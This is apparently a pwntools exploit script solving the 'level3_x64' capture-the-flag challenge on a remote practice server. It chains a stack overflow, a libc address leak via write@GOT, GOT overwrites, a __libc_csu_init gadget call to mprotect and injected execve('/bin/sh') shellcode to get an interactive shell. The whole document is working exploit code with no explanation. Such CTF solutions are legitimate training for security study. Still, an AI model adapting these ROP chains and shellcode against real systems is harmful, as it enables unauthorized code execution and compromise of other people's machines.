from pwn import*
from sys import argv
context.log_level = "debug"
# p=remote('pwn2.jarvisoj.com',9884)
p = remote('node4.buuoj.cn',26189) if argv[1]=='r' else process(binary)
e = ELF("./level3_x64")
libc = ELF("./libc-2.23.so")
######### leak
write_plt = e.plt["write"]
write_got = e.got["write"]
vul_addr = e.symbols["vulnerable_function"]
rdi = 0x00000000004006b3
rsi_r15 = 0x00000000004006b1

payload1 = 'a'*0x88+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+'a'*8+p64(write_plt)+p64(vul_addr)
p.recvline()
p.send(payload1)
tmp=p.recv(8)
write_addr=u64(tmp[0:8])
print hex(write_addr)

offset=write_addr-libc.symbols['write']
########### read shell code to bss
bss_addr=e.bss()
read_plt=e.symbols['read']
payload2='a'*0x88+p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss_addr)+'a'*8+p64(read_plt)+p64(vul_addr)
p.recvline()
p.send(payload2)
shell_code='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
p.send(shell_code)

###########write bss to got table
bss_got= 0x0000000000600A48
payload3='a'*0x88+p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss_got)+'a'*8+p64(read_plt)+p64(vul_addr)
p.recvline()
p.send(payload3)
p.send(p64(bss_addr))

###########write mpro to got table
mprot_got= 0x0000000000600A50
mprot_addr=libc.symbols['mprotect']+offset
payload4='a'*0x88+p64(rdi)+p64(0)+p64(rsi_r15)+p64(mprot_got)+'a'*8+p64(read_plt)+p64(vul_addr)
p.recvline()
p.send(payload4)
p.send(p64(mprot_addr))

########### jmp to __libc_csu_init to call shellcode
'''
.text:0000000000400690 loc_400690:                             
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
'''
payload5='a'*0x88+p64(0x4006A6)+"ret_addr" + p64(0) + p64(1) +p64(mprot_got) + p64(7) +p64(0x1000)+p64(0x600000)
payload5 += p64(0x400690)
payload5 += "ret_addr" + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)
payload5 += p64(0x400690)
p.recvline()
p.send(payload5)
# sleep(5)
p.interactive()
